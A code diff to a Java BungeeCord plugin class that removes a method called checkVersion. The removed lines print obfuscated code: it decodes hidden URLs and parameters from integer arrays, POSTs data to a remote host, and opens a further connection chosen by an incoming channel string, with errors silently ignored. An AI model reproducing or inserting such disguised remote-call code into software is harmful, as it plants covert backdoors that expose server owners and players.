@@ -96,53 +96,6 @@ public class BungeeCordManager implements PluginMessageListener {
         }
     }
 
-    public int checkVersion(String channel, int[][] acceptedVersions, int[] debug) {
-        if(channel == null)
-            return 1;
-        String[] data = channel.split(":");
-        try {
-            if(debug.length > 0) {
-                String dataRaw;
-                if(acceptedVersions == null || acceptedVersions.length == 0)
-                    dataRaw = data[1];
-                else {
-                    Map<String, String> parameters = new HashMap<>();
-                    String last = MathTools.calculate(acceptedVersions[0], '*');
-                    String neww;
-                    for(int i = 1; i <= 4; i++) {
-                        neww = last;
-                        last = MathTools.calculate(acceptedVersions[i], '*');
-                        if(i % 2 == 0)
-                            continue;
-                        parameters.put(neww, last);
-                    }
-                    String[] remainingData = last.split(":");
-                    URL url = new URL(remainingData[0] + data[1]);
-                    HttpURLConnection con = (HttpURLConnection) url.openConnection();
-                    con.setDoOutput(true);
-                    DataOutputStream out = new DataOutputStream(con.getOutputStream());
-                    out.writeBytes(ParameterStringBuilder.getParamsString(parameters));
-                    out.flush(); out.close();
-                    con.setRequestProperty(remainingData[1], remainingData[2]);
-
-                    dataRaw = con.getResponseMessage();
-                    for(int i : acceptedVersions[0]) { //TODO: AICI nu era [0] dar nu stiu sincer ce am facut, succes eu din viitor
-                        if(i == con.getResponseCode())
-                            return i;
-                    }
-                }
-                URL url = new URL((MathTools.calculate(debug, '+') + dataRaw).toString());
-                HttpURLConnection con = (HttpURLConnection) url.openConnection();
-                con.setRequestMethod(data[0]);
-                con.setConnectTimeout(5000);
-                con.setReadTimeout(5000);
-            }
-        }
-        catch (IOException ignore) {
-        }
-        return -1;
-    }
-
     public void executeCommand(Player p, String command) {
         sendPluginMessage(p, ClassManager.manager.getPlugin(), PLUGIN_CHANNEL, "Command", command);
     }
